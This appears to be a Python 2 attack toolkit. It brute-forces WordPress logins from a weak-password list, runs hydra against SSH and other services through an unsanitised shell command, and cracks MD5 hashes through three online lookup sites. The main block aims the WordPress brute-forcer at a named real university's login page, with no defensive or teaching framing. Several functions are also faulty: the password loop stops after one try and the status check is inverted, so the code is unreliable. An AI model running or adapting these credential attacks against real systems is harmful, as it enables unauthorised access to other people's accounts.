import time

__author__ = 'ruluo1992-PC'

from string import Template
import subprocess
import result
import os
import time
import sys
import urllib
import urllib2
import re

def bruteforce_wordpress(url, name, result):
    pwd = '/root/weak.txt'
    #pwd = 'D:\\weak.txt'
    for line in open(pwd):
        lineline = line.strip().replace('\n', '')
        print lineline
        data = urllib.urlencode({'log':name,'pwd':lineline,'redirect_to':''})
        content = urllib.urlopen(url, data)
        if content.read() == '':
            result.bruteforce_wordpress = lineline
            return
        break
    data = urllib.urlencode({'log':name,'pwd':name,'redirect_to':''})
    content = urllib.urlopen(url, data)
    if content.read() == '':
        result.bruteforce_wordpress = name
        return
    result.bruteforce_wordpress = 'Not Found'


def hydra(ip, protocal):
    command_t = Template('hydra -L /home/username.txt -P /home/password.txt ${ip} ${protocal} -Vv')
    command = command_t.substitute(lang = 'Python', ip = ip, protocal = protocal)
    print command
    process = subprocess.Popen(command, shell = True)
    return process

def hydra_getstatus(process):
    if process.poll() == None:
        return 'Done'
    oldoutput = sys.stdout
    sys.stdout = open('catch.tmp', 'w+')
    time.sleep(2)
    fs = open('catch.tmp', 'r')
    lines = ''
    try:
        lines = fs.read()
    finally:
        fs.close()
    sys.stdout = oldoutput
    return lines

def md5_2d5(md5):
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')]
    data = {'md5':md5, 'sha256':'', 'lx':'chkmysql', 'chkmd':'%E6%9F%A5%E8%AF%A2'}
    response = urllib2.urlopen(url='http://www.2d5.net/', data = urllib.urlencode(data))
    content = response.read()
    m = re.search(r'<font color=red size=3>.*?:(.*?)</font>', content)
    if m:
        return m.group(1)
    else:
        return 'Not Found'

def md5_somd5(md5):
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')]
    data = {'isajax':'4EwiOuxVd-ypNoATher0vyt','md5':md5}
    response = urllib2.urlopen(url='http://www.somd5.com/somd5-index-md5.html', data = urllib.urlencode(data))
    content = response.read()
    m = re.search(r'<h1 style="display:inline;">(.*?)</h1>', content)
    if m:
        return m.group(1)
    else:
        return 'Not Found'

def md5_md5cc(md5):
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'), ('Referer', 'http://www.md5.cc/')]
    target = 'http://www.md5.cc//ShowMD5Info.asp?GetType=ShowInfo&no-cache=0.730324269970879&md5_str=' + md5 + '&_='
    response = opener.open(target)
    content = response.read()
    print content
    m = re.search(r'>([a-zA-Z0-9]*?)</span>', content)
    if m:
        return m.group(1)
    else:
        return 'Not Found'

def md5_crack(md5, result):
    result['www.2d5.net'] = md5_2d5(md5)
    result['www.somd5.com'] = md5_somd5(md5)
    result['www.md5.cc'] = md5_md5cc(md5)

    #print md5_2d5(md5)
    #print md5_somd5(md5)
    #print md5_md5cc(md5)


if __name__ == '__main__':
    r = result.result()
    #process = hydra('10.1.10.115', 'ssh')
    #while 1:
    #    status = hydra_getstatus(process)
    #    print status
    #    if status == 'Done':
    #        break
    #md5_crack('47BCE5C74F589F4867DBD57E9CA9F8E8')
    bruteforce_wordpress('http://jwjcc.bfsu.edu.cn/wp-login.php', 'jwjcc', r)
    print r.bruteforce_wordpress
